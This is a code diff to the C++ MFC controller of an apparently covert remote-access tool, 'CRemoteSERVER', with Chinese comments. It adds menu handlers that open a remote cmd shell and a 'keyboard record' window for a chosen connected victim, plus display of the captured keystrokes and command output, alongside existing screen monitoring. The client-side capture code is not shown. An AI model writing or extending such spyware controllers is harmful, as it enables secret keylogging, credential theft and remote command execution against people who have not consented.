@@ -13,15 +13,13 @@
 #ifdef _DEBUG
 #define new DEBUG_NEW
 #endif
-
+//线程参数
 struct param
 {
 public:
 	SOCKET* sclient;
 	Mysession *psession;
 };
-
-
 
 DWORD WINAPI recvthread(LPVOID lparam)
 {
@@ -41,9 +39,11 @@ DWORD WINAPI recvthread(LPVOID lparam)
 		bret = recvdata(*(p->sclient), (char*)&drbuf, sizeof(unsigned int) * 2);
 		if (!bret) return 0;
 
+		senddatahead(*(p->sclient), SERVER_BEAT);
+
 		if (drbuf.length >= 0)
 		{
-			pdata = new char[drbuf.length];
+			pdata = new char[drbuf.length+1];
 			if (pdata == NULL) return 0;
 
 			recvdata(*(p->sclient), pdata, drbuf.length);
@@ -55,11 +55,24 @@ DWORD WINAPI recvthread(LPVOID lparam)
 			if (drbuf.type == CLIENT_KEYBOARD_BACK)
 			{
 				//输出keyboard数据
+				if (p->psession->pkeyboarddlg != NULL)
+				{
+					p->psession->pkeyboarddlg->edit_keyboard_record.SetSel(-1);
+					p->psession->pkeyboarddlg->edit_keyboard_record.ReplaceSel((CString)pdata+ "\r\n");
 
+				}
 			}
 			else if (drbuf.type == CLIENT_CMD_BACK)
 			{
 				//输出cmd数据
+				if (p->psession->pcmddlg != NULL)
+				{
+					p->psession->pcmddlg->sclient = *(p->sclient);
+
+					p->psession->pcmddlg->edit_output.SetSel(-1);
+					p->psession->pcmddlg->edit_output.ReplaceSel((CString)pdata);
+				}
+
 			}
 			else if (drbuf.type == CLIENT_SCREEN_BACK)
 			{
@@ -73,10 +86,7 @@ DWORD WINAPI recvthread(LPVOID lparam)
 					}
 				}
 			}
-			else if (drbuf.type == Client_BEAT)
-			{
-				senddatahead(*(p->sclient), SERVER_BEAT);
-			}
+
 			if (pdata != NULL) delete[] pdata;
 		}
 	}
@@ -107,7 +117,6 @@ DWORD WINAPI CRemoteSERVERDlg::acceptthread(LPVOID lparam)
 						//处理socket
 						/*closesocket(s);*/
 						del.push_back(s);
-
 					}
 				}
 
@@ -271,6 +280,8 @@ BEGIN_MESSAGE_MAP(CRemoteSERVERDlg, CDialogEx)
 	ON_WM_QUERYDRAGICON()
 	ON_NOTIFY(NM_RCLICK, IDC_LIST2, &CRemoteSERVERDlg::OnNMRClickList2)
 	ON_COMMAND(ID_SCREEN, &CRemoteSERVERDlg::OnScreen)
+	ON_COMMAND(ID_CMD, &CRemoteSERVERDlg::OnCmd)
+	ON_COMMAND(ID_KEYBOARD, &CRemoteSERVERDlg::OnKeyboard)
 END_MESSAGE_MAP()
 
 
@@ -371,7 +382,7 @@ HCURSOR CRemoteSERVERDlg::OnQueryDragIcon()
 }
 
 
-
+//菜单加载
 void CRemoteSERVERDlg::OnNMRClickList2(NMHDR* pNMHDR, LRESULT* pResult)
 {
 	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
@@ -393,7 +404,7 @@ void CRemoteSERVERDlg::OnNMRClickList2(NMHDR* pNMHDR, LRESULT* pResult)
 	*pResult = 0;
 }
 
-
+//选中屏幕监控
 void CRemoteSERVERDlg::OnScreen()
 {
 	// TODO: 在此添加命令处理程序代码
@@ -415,3 +426,45 @@ void CRemoteSERVERDlg::OnScreen()
 	}
 }
 
+//选中cmd交互
+void CRemoteSERVERDlg::OnCmd()
+{
+	// TODO: 在此添加命令处理程序代码
+	//获取当前选中行的socket,向其交互cmd数据
+	int pos = list_client.GetSelectionMark();
+
+	SOCKET sclient = list_client.GetItemData(pos);
+
+	{
+		std::lock_guard<std::mutex> lg(accept_mutex);
+		if (map_session[sclient]->pcmddlg == NULL)
+		{
+			map_session[sclient]->pcmddlg = new Ccmddlg;
+			map_session[sclient]->pcmddlg->Create(IDD_Ccmddlg, this);
+		}
+	}
+	map_session[sclient]->pcmddlg->ShowWindow(SW_SHOW);
+
+	senddatahead(sclient,SEVER_CMD_COMMAND);
+}
+
+//选中键盘记录
+void CRemoteSERVERDlg::OnKeyboard()
+{
+	// TODO: 在此添加命令处理程序代码
+	//获取当前选中行的socket,接受键盘记录数据
+	int pos = list_client.GetSelectionMark();
+
+	SOCKET sclient = list_client.GetItemData(pos);
+
+	{
+		std::lock_guard<std::mutex> lg(accept_mutex);
+		if (map_session[sclient]->pkeyboarddlg == NULL)
+		{
+			map_session[sclient]->pkeyboarddlg = new Ckeyboarddlg;
+			map_session[sclient]->pkeyboarddlg->Create(IDD_Ckeyboarddlg, this);
+		}
+	}
+
+	map_session[sclient]->pkeyboarddlg->ShowWindow(SW_SHOW);
+}
